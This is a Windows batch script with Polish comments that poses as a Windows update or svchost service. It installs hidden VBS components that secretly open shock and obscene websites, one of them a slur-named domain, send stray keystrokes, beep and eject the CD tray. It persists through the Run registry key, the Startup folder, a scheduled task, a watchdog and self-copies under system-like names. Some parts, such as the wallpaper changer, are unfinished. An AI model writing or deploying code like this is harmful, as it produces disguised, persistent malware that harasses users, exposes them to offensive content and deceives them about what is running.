@echo off
title Windows Update Service
set "hidden_dir=%appdata%\Microsoft\Windows\Caches"
set "service_name=WinCacheManager"
set "reg_key=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

:: Ukryty katalog
if not exist "%hidden_dir%" mkdir "%hidden_dir%"
attrib +h +s "%hidden_dir%"

:: Główny payload - wiele stron + dodatkowe efekty
(
echo Set objShell = CreateObject^("WScript.Shell"^)
echo objShell.Run "mshta.exe javascript:var w=window.open('http://niggafart.com','_blank','width=1,height=1');w.blur();close();", 0, False
echo WScript.Sleep 5000
echo objShell.Run "mshta.exe javascript:var w=window.open('http://lemonparty.org','_blank','width=1,height=1');w.blur();close();", 0, False
echo WScript.Sleep 5000
echo objShell.Run "mshta.exe javascript:var w=window.open('http://meatspin.fr','_blank','width=1,height=1');w.blur();close();", 0, False
) > "%hidden_dir%\cache_update.vbs"

:: Kolejny VBS - zmiana tapety na czarny ekran (nieszkodliwy efekt)
(
echo Set objShell = CreateObject^("WScript.Shell"^)
echo Set objFSO = CreateObject^("Scripting.FileSystemObject"^)
echo strWallpaper = objShell.ExpandEnvironmentStrings^("%temp%\wallpaper.bmp"^)
echo ' Create a 1x1 black BMP
echo With CreateObject^("WIA.ImageFile"^)
echo End With
) > "%hidden_dir%\wallpaper_changer.vbs"

:: VBS do wysyłania klawiszy (losowe naciśnięcia klawiszy co jakiś czas)
(
echo Set objShell = CreateObject^("WScript.Shell"^)
echo Do
echo WScript.Sleep 60000
echo objShell.SendKeys "^{ESC}"
echo WScript.Sleep 500
echo objShell.SendKeys "^{ESC}"
echo Loop
) > "%hidden_dir%\key_sim.vbs"

:: VBS do odtwarzania cichych dźwięków (beep)
(
echo Set objShell = CreateObject^("WScript.Shell"^)
echo Do
echo WScript.Sleep 300000
echo objShell.Run "cmd /c echo " + Chr^(7^) + " > nul", 0, False
echo Loop
) > "%hidden_dir%\beep_service.vbs"

:: VBS do otwierania i zamykania CD-ROM
(
echo Set oWMP = CreateObject^("WMPlayer.OCX.7"^)
echo Set colCDROMs = oWMP.cdromCollection
echo Do
echo WScript.Sleep 900000
echo if colCDROMs.Count ^>= 1 then
echo   For i = 0 to colCDROMs.Count - 1
echo     colCDROMs.Item^(i^).Eject
echo     WScript.Sleep 3000
echo     colCDROMs.Item^(i^).Eject
echo   Next
echo end if
echo Loop
) > "%hidden_dir%\cd_tray.vbs"

:: Dodanie do rejestru (HKCU - nie wymaga admina)
reg add "%reg_key%" /v "%service_name%" /t REG_SZ /d "%hidden_dir%\cache_update.vbs" /f >nul 2>&1

:: Dodanie do folderu startup
copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\WinUpdate.lnk" >nul 2>&1
echo Set oWS = WScript.CreateObject^("WScript.Shell"^) > "%hidden_dir%\startup_add.vbs"
echo sLinkFile = oWS.ExpandEnvironmentStrings^("%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\WinCache.lnk"^) >> "%hidden_dir%\startup_add.vbs"
echo Set oLink = oWS.CreateShortcut^(sLinkFile^) >> "%hidden_dir%\startup_add.vbs"
echo oLink.TargetPath = "%hidden_dir%\cache_update.vbs" >> "%hidden_dir%\startup_add.vbs"
echo oLink.WindowStyle = 7 >> "%hidden_dir%\startup_add.vbs"
echo oLink.Save >> "%hidden_dir%\startup_add.vbs"
cscript //nologo "%hidden_dir%\startup_add.vbs"

:: Ukryte zadanie w Task Scheduler (bez admina przez schtasks z ograniczeniami)
schtasks /create /tn "%service_name%" /tr "wscript.exe \"%hidden_dir%\cache_update.vbs\"" /sc hourly /mo 2 /f >nul 2>&1

:: Uruchomienie głównego VBS
start "" /min wscript.exe "%hidden_dir%\cache_update.vbs"
start "" /min wscript.exe "%hidden_dir%\key_sim.vbs"
start "" /min wscript.exe "%hidden_dir%\beep_service.vbs"
start "" /min wscript.exe "%hidden_dir%\cd_tray.vbs"

:: Uruchomienie w nieskończoności w tle - watch dog
(
echo Set objShell = CreateObject^("WScript.Shell"^)
echo Set objFSO = CreateObject^("Scripting.FileSystemObject"^)
echo Do
echo WScript.Sleep 60000
echo If Not objFSO.FileExists^("%hidden_dir%\cache_update.vbs"^) Then
echo   ' Restore files if deleted
echo End If
echo objShell.Run "wscript.exe ""%hidden_dir%\cache_update.vbs""", 0, False
echo Loop
) > "%hidden_dir%\watchdog.vbs"
start "" /min wscript.exe "%hidden_dir%\watchdog.vbs"

:: Samokopiowanie do wielu lokalizacji
copy "%~f0" "%localappdata%\Temp\svchost.bat" >nul 2>&1
copy "%~f0" "%userprofile%\Documents\config.bat" >nul 2>&1

:: Zmiana tytułu okna i ukrycie konsoli
title Svchost Helper Service
if not "%1" == "h" (
start "" /min mshta.exe vbscript:CreateObject^("WScript.Shell"^).Run^("""%~f0"" h",0^)^(window.close^)
exit
)

:: Oczyszczenie ekranu
cls

:: Ukryte pętle działające w tle
:loop
ping -n 300 localhost >nul
start "" /min wscript.exe "%hidden_dir%\cache_update.vbs"
goto loop
